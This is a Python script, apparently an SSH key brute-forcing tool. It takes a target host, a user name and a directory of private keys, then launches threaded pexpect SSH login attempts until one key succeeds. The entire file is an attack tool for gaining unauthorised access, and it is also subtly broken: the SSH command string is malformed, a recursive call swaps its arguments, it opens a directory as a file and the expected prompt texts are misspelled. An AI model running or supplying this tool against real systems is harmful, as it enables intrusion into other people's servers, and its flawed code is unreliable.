from pexpect import pxssh
import optparse
import time
from threading import *
import os

import pexpect

# global variables
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(host, user, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = "Permission denied"
        ssh_newkey = "Are u sure u want to continue"
        conn_closed = "Connect closed by remote host"
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#3',])
        if ret == 2:
            print('[-] Adding Host to ~/ .ssh/know_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connect Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('[-] Success. ' + str(keyfile))
            Stop = True
        
        
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('Missing flag: ' + '-H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    options, args = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    if host == None or passDir == None or user == None:
        print(parser.usage)
        exit(0)

    fn = open(passDir, 'r')
    for filename in os.listdir(passDir):
        if Stop:
            print("[*] Exiting: Key Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Connections Closed By Remote Host.")
            exit(0)
        connection_lock.acquire()
        full_path = os.path.join(passDir, filename)
        print("[-] Testing: " + str(full_path))
        t = Thread(target=connect, args=(host, user, full_path, True))
        child = t.start()


if __name__ == "__main__":
    main()